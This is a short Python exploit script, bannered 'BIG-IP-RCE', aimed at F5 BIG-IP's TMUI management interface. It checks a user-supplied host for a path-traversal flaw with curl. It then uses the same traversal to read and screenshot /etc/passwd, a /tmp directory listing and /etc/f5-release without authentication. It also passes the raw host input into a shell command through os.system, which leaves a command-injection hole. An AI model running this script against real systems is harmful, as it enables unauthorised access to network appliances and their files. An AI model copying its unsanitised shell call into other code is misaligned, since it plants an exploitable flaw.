#!/usr/bin/python3
import os
import requests
import urllib3
import imgkit

print ("""       ____ ___ ____      ___ ____       ____   ____ _____ 
	        | __ )_ _/ ___|    |_ _|  _ \     |  _ \ / ___| ____|
	        |  _ \| | |  _ _____| || |_) |____| |_) | |   |  _|  
	        | |_) | | |_| |_____| ||  __/_____|  _ <| |___| |___ 
	        |____/___\____|    |___|_|        |_| \_\\____|_____|  """)
print (" ") 

host= input( "Enter the host Domain/IP:")
cmd = "curl -sk 'https://"+host+"/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=Vulnerable' | grep -q Vulnerable && printf '\033[0;31mVulnerable\n' || printf '\033[0;32mNot Vulnerable\n'"
a = os.system(cmd)



imgkit.from_url("https://"+host+"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd","etc_password.jpg")
imgkit.from_url("https://"+host+"/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/tmp","directory.jpg")
imgkit.from_url("https://"+host+"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release","F5-realase.jpg")
